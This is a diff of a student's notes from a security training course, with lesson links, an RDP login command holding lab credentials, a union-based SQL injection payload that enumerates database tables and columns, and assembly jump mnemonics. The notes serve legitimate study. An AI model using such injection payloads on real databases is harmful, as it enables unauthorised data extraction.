@@ -2,6 +2,7 @@
 SECURITY DAY 3 MODULE LINKS AND INFO:
 STUDENT FG: https://sec.cybbh.io/public/security/latest/lessons/lesson-5-sql_sg.html
 STUDENT SLIDES: https://sec.cybbh.io/-/public/-/jobs/842473/artifacts/slides/05-sql-injection-slides.html
+WINDOWS OP STATION CMD: xfreerdp /u:student /p:password /dynamic-resolution +clipboard /v:10.50.28.16
 ----------------------------------------------------------------------------------------------------
 GENERAL INFO
 Audi' UNION select table_schema,2,table,table_name,column_name,5 FROM information_schema.columns WHERE table_schema='session';#
@@ -28,3 +29,4 @@ JMP Jump to specified location
 JLE Jump if less than or equal
 JE Jump if equal
 ----------------------------------------------------------------------------------------------------
+REVERSE ENGINEERING DEMO 1:
